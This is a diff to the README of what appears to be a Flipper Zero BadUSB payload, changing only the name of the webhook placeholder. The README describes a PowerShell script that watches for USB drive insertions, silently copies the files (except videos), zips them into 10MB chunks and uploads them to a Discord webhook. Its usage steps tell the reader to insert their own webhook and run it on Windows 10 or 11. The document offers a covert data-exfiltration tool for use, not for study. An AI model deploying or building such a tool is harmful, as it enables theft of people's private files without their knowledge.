@@ -4,7 +4,7 @@
 This Flipper Zero payload runs a PowerShell script that monitors for USB device insertions. When a USB is plugged in, it copies all files (excluding videos), compresses them into 10MB zip chunks, and uploads them to a specified Discord webhook.
 
 ## Usage  
-- Replace `DISCORD_WEBHOOK_HERE` in the `.txt` script with your actual Discord webhook URL.  
+- Replace `WEBHOOK_LINK` in the `.txt` script with your actual Discord webhook URL.  
 - Run the payload on a Windows 10 or 11 system.  
 - On USB insertion, files are silently copied, compressed, and uploaded.  
 
